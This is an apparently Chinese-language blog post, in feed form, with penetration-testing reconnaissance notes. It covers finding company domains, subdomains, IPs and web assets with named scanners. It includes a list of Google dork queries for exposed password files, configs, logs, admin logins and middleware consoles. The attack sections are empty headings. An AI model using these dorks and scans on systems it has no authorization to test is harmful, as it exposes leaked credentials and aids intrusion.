    <id>http://example.com/2023/10/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2023-10-09T16:00:00.000Z</published>
    <updated>2023-10-11T05:48:09.470Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>渗透之基础。</p><span id="more"></span><h1 id="公司级别（获取目标域名）"><a href="#公司级别（获取目标域名）" class="headerlink" title="公司级别（获取目标域名）"></a>公司级别（获取目标域名）</h1><ol><li><p>得到公司名，使用Google搜索得到官网，官网一般主域名。</p></li><li><p>使用企查查，天眼查，域名备案获取主域名。也可以得到相关身份信息（人名，手机号，邮箱）<br><a href="www.qcc.com">企查查</a>  <a href="https://www.tianyancha.com/">天眼查</a>  <a href="https://www.freebuf.com/sectool/284285.html">境外企业信息查询小工具</a></p></li><li><p>利用whois查询，whois反查获取域名相关信息<br><a href="http://whois.chinaz.com/">站长之家</a><br><a href="https://x.threatbook.cn/">微步</a></p></li><li><p>查看ip信息，有无CDN<br><a href="https://ping.chinaz.com/">站长工具</a><br><a href="https://www.ipshudi.com/">IP反查</a><br><a href="https://www.ssllabs.com/ssltest/analyze.html">SSL Lab查找真实IP</a></p></li></ol><h1 id="域名级别（获取目标子域名）"><a href="#域名级别（获取目标子域名）" class="headerlink" title="域名级别（获取目标子域名）"></a>域名级别（获取目标子域名）</h1><ol><li><p>子域名收集<br>Oneforall - 自动化，收集比较全，使用方便<br>fofa语法: <code>domain=&quot;anikore.jp&quot;</code></p></li><li><p>查旁站<br><a href="https://chapangzhan.com/">查旁站</a><br><a href="https://ipchaxun.com/">ip查询</a><br><a href="https://stool.chinaz.com/same?s=178.79.181.137">站长工具</a></p></li><li><p>Google语法<br>迅速查找信息泄露、管理后台暴露等漏洞语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Google hack实战-搜索敏感文件</span><br><span class="line">filetype:txt 登录</span><br><span class="line">filetype:xls 登录</span><br><span class="line">filetype:doc 登录</span><br><span class="line">site:xxx.com filetype:doc intext:pass</span><br><span class="line">site:xxx.com filetype:xsl intext:pass</span><br><span class="line">site:xxx.com filetype:conf</span><br><span class="line">site:xxx.com filetype:inc</span><br><span class="line">filetype:log iserror.log</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Google hack实战-搜索登陆后台</span><br><span class="line">intitle:后台管理</span><br><span class="line">intitle:login</span><br><span class="line">intitle: 后台管理 inurl:admin</span><br><span class="line">intitle:index of /</span><br><span class="line">site:example.com filetype:txt 登录</span><br><span class="line">site:example.com intitle: 后台管理</span><br><span class="line">site:example.com admin</span><br><span class="line">site:example.com login</span><br><span class="line">site:example.com system</span><br><span class="line">site:example.com 管理</span><br><span class="line">site:example.com 登录</span><br><span class="line">site:example.com 内部</span><br><span class="line">site:example.com 系统</span><br><span class="line">site:xxx.com admin</span><br><span class="line">site:xxx.com login</span><br><span class="line">site:xxx.com 管理</span><br><span class="line">site:example.com system</span><br><span class="line">site:example.com 登录</span><br><span class="line">site:example.com 内部</span><br><span class="line">site:example.com 系统</span><br><span class="line">site:example.com filetype:txt 登录</span><br><span class="line">site:example.com intitle:后台管理</span><br><span class="line">inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</span><br><span class="line">site:example.com intext:管理|后台|登录|用户名|密码|验证码|系统|账号|admin|login|sys|management|password|username</span><br><span class="line"></span><br><span class="line">Google hack实战-搜索中间件</span><br><span class="line">Weblogic</span><br><span class="line"></span><br><span class="line">inurl:/console/login/LoginForm.jsp site:domian</span><br><span class="line">inurl:/console/login/LoginForm.jsp intitle:Oracle WebLogin Server site:domain</span><br><span class="line">inurl:/console/login/ intitle:&quot;Oracle WebLogin Server 管理控制台&quot; site:domain</span><br><span class="line"></span><br><span class="line">Jboss</span><br><span class="line"></span><br><span class="line">inurl:/jmx-console/htmladaptor site:domain</span><br><span class="line"></span><br><span class="line">Websphere</span><br><span class="line"></span><br><span class="line">inutl:/ibm/console/login.jsp site:domain</span><br></pre></td></tr></table></figure></li></ol><h1 id="IP级别（获取目标IP）"><a href="#IP级别（获取目标IP）" class="headerlink" title="IP级别（获取目标IP）"></a>IP级别（获取目标IP）</h1><ol><li><p>域名转IP<br>可使用在线工具: <a href="https://www.useotools.com/zh/domain-into-ip/output">域名转IP</a></p></li><li><p>C段信息<br>使用cIPR</p></li><li><p>存活探测，端口扫描，常见服务爆破<br>使用fscan</p></li><li><p>查找资产<br>使用fofa，zoomeye等</p></li></ol><h1 id="web级别（获取目标web信息）"><a href="#web级别（获取目标web信息）" class="headerlink" title="web级别（获取目标web信息）"></a>web级别（获取目标web信息）</h1><ol><li><p>识别网站框架cms<br>用插件Wappalyzer</p></li><li><p>路径收集<br>使用dirbuster，御剑等</p></li><li><p>敏感信息收集<br>使用JSFinder</p></li></ol><p>Nessus<br><a href="https://www.cnblogs.com/chenyablog/p/15302755.html">渗透清单1</a><br><a href="https://blog.csdn.net/quandaquan/article/details/126986847">渗透清单2</a><br><a href="https://zhuanlan.zhihu.com/p/325941785">渗透清单3</a></p><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>存在输入的地方<br>工具：SQLMAP<br>类型：联合注入，报错注入，布尔盲注，时间盲注，二次注入，宽字节注入，堆叠注入<br>数据库：MySQL, MSSQL, Oracle</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>etc</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;渗透之基础。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="信息收集" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="渗透测试" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
